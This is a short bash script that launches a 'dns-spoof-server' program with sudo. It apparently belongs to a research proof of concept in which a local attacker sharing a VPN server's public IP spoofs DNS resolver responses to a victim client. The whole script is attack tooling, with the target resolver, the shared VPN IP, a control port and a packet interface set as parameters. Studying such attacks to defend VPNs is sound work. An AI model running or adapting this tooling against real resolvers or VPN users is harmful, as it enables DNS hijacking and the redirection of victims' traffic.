# !/bin/bash

# If you do not have an IP spoofable machine, you can run the codes at the DNS resolver itself.
# In that case, the extra process only sends packets required by the local attacker and should not expose victim state directly.

REMOTE_DNS_IP=1.1.1.1; # IP of the DNS resolver whose responses will be spoofed
REMOTE_DNS_PORT=53; # DNS service port on the resolver
VPN_WAN_IP=45.67.97.71; # Public IP shared by the victim client and the local attacker after they connect to the VPN server
SPOOF_SERVER_PORT=8081; # HTTP control port used by the local attacker
PACKET_IFACE="eth0"; # Interface used to send spoofed packets

printf "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n~~~~~~~~~~~ Run DNS spoofable server ~~~~~~~~~~~\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
echo `date`

sudo ./dns-spoof-server ${REMOTE_DNS_IP} ${REMOTE_DNS_PORT} ${VPN_WAN_IP} ${SPOOF_SERVER_PORT} ${PACKET_IFACE}

echo `date`
